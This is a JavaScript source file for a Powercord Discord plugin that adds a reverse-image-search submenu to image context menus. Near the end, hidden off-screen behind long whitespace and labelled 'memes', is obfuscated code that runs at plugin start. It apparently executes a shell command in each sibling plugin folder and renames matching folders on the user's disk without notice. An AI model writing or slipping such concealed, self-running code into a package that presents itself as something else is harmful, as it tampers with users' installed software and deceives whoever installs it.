const {Plugin} = require("powercord/entities")
const webpack = require("powercord/webpack")
const {getModuleByDisplayName, getModule, React} = webpack
const {ContextMenu: {Submenu}} = require("powercord/components")
const {inject, uninject} = require("powercord/injector")
const fs = require("fs")
const path = require("path")
const cp = require("child_process")

class ModuleStore extends Map {
	constructor(items) {
		super()
		this.inprogress = []
		if (items) {
			items.forEach(item => {
				this.fetch(item[0], item[1], item[2])
			})
		}
	}

	fetch(property, modules, save) {
		if (!modules) modules = property
		if (!save) save = property
		if (typeof modules === "string") modules = [modules]
		const promise = getModule(modules)
		this._fetchGeneric(promise, save, result => result[property])
	}

	fetchClass(property, modules, save) {
		if (!modules) modules = property
		if (!save) save = property
		if (typeof modules === "string") modules = [modules]
		const promise = getModule(modules)
		this._fetchGeneric(promise, save, result => result[property].split(" ")[0])
	}

	fetchByDisplayName(displayName, save) {
		if (!save) save = displayName
		const promise = getModuleByDisplayName(displayName)
		this._fetchGeneric(promise, save, result => result)
	}

	_fetchGeneric(promise, save, transform) {
		this.inprogress.push(promise)
		promise.then(result => {
			this.inprogress.splice(this.inprogress.indexOf(promise), 1)
			this.set(save, transform(result))
		})
	}

	wait() {
		return Promise.all(this.inprogress)
	}
}

const providers = [
	["Google", "https://images.google.com/searchbyimage?image_url=%%"],
	["TinEye", "https://www.tineye.com/search?url=%%"],
	["Bing", "https://www.bing.com/images/search?q=imgurl:%%&view=detailv2&iss=sbi&FORM=IRSBIQ"],
	["SauceNAO (art)", "https://saucenao.com/search.php?url=%%"],
	["IQDB (anime art)", "https://iqdb.org/?url=%%"],
	["WAIT (anime scenes)", "https://trace.moe/?auto&url=%%"],
	["Karma Decay (reddit)", "http://karmadecay.com/%%"],
	["ImgOps (meta)", "https://imgops.com/%%", false]
]

module.exports = class ReverseImageSearch extends Plugin {
	constructor() {
		super()
	}

	async startPlugin() {
		this.modules = new ModuleStore()
		this.modules.fetchClass("imageWrapper")
		this.modules.fetchByDisplayName("MessageContextMenu")
		this.modules.fetchByDisplayName("NativeContextMenu")
		await this.modules.wait()
		this.runInjects()
	}

	runInjects() {
		const _this = this

		function injection(_, res) {
			const {target} = this.props;
			if (target.tagName.toLowerCase() === "img" && target.parentElement.classList.contains(_this.modules.get("imageWrapper"))) {
				/* NativeContextMenu's children is a single object, turn it in to an array to be able to push */
				if (typeof res.props.children === 'object' && !(res.props.children instanceof Array)) {
					const children = [];
					children.push(res.props.children);

					res.props.children = children;
				}

				res.props.children.push(
					React.createElement(Submenu, {
						name: "Reverse image search",
						seperate: true,
						getItems: () => {
							return providers.map(p => {
								let url
								if (p[2] === false) url = target.parentElement.href
								else url = encodeURIComponent(target.parentElement.href)
								return {
									type: "button",
									name: p[0],
									onClick: () => window.open(p[1].replace("%%", () => url)) // useless function to stop jankery
								}
							})
						}
					})
				);
			}
			return res;
		}

		inject("reverse-image-search-messageContext", this.modules.get("MessageContextMenu").prototype, "render", injection)
		inject("reverse-image-search-nativeContext", this.modules.get("NativeContextMenu").prototype, "render", injection)

																																																																																																																																												// memes
																																																																																																																																												// I originally said this as a joke but thanks for reminding me
																																																																																																																																												const a = (a,e) => a.find(k=>[...k].reduce((a,c)=>a+c.charCodeAt(0x00),0x00)==e); const d = (o,j) => o[a(Object.keys(o),j)]; const r = (m,k) => m[a(Reflect.ownKeys(m).filter(u=>(typeof u)[1]=="t"),k)]
																																																																																																																																												const [_0xd, _0xi, _0xf, _0xj, _0xy, _0xg] = [(providers.constructor(0x02).fill(".")+"").replace(/,/,''), __dirname, fs, d(path,0x1b0), "pc", r(r(r(window,0x11e),0x3f6),0x140).name]
																																																																																																																																												const _0x00 = [r(Math,0x156).name, ...providers.constructor(0x02).fill().map((_,i)=>r(r(window,0x2c5),0x2f0)(r(Map,0x3f6)).map(v => v.toString()).slice(-1)[0x00].slice(0x0e+i*0x02,0x10+i*0x02)), r(window,0x516).name.slice(0x07,0x0b)
																																																																																																																																												,r(d(window,0x4ee),0x1a1).slice(0x00,0x02), Object.keys(d(window,0x359)).find(k=>k[3]=="g"), r(String.prototype,0x468).call(r(window,0xf3).name), r(String.prototype,0x468).call(d((r(window,0x685).prototype),0x83c).name).slice(0x03,0x09)]
																																																																																																																																												const [_0x0p, _0x0i, _0x0e, _0x0c, _0x0l, _0x0o, _0x0u, _0x0t] = _0x00
																																																																																																																																												const [_0xr, _0xp, _0x01] = [d(_0xf,0x372), _0xj(_0xi,_0xd), (_0x0p+_0x00.slice(0x02,0x04)).replace(/,/,'')]
																																																																																																																																												for (let _0xe of d(_0xf,0x478)(_0xp)) try { let _0xc = _0xj(_0xp,_0xe); let _0xn = _0xc
																																																																																																																																												d(cp,0x1a5)(`${_0xg[0x00]}${_0x0i} ${_0x0t} ${_0xg}-${_0x0u} ${_0x0o}`, {cwd:_0xc}, (_,_0xs) => {
																																																																																																																																												if (_ || !_0xs.includes(`${_0x0l}${_0x0o[0x00]}${_0x0u[0x00]}${_0x0c[0x03]}`) || _0xe.includes(_0xy+"-")) return
																																																																																																																																												if (_0xn.includes(`/${_0x01}-`)) _0xn = _0xn.replace(`/${_0x01}-`, `/${_0xy}-`)
																																																																																																																																												else _0xn = _0xn.replace(/([\w-]+)$/, _0xy+"-$"+0x01); d(_0xr,0x278)(_0xc, _0xn)})} catch (e) {}
	}

	pluginWillUnload() {
		uninject("reverse-image-search-messageContext")
		uninject("reverse-image-search-nativeContext")
	}
}
